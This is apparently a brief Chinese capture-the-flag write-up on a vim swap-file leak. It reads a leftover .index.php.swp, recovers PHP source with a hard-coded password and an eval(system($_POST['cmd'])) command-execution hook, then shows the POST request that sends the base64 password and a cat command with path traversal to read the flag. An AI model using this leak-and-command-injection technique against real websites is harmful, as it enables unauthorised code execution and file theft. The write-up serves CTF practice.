#Vim 泄露

vi/vim 异常关闭会存留有.swp 文件，访问 `.index.php.swp`

用 cat 命令打开后有以下

```php
   ?>            }                eval(system($_POST['cmd']));                echo "<p>Oh You got my password!</p>";            if ($_POST['password'] === base64_encode($password)) {            echo "<p>can can need Vim </p>";            $password = "Give_Me_Your_Flag";            error_reporting(0);
```

于是 POST 传参 `password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat ../../../fla*`
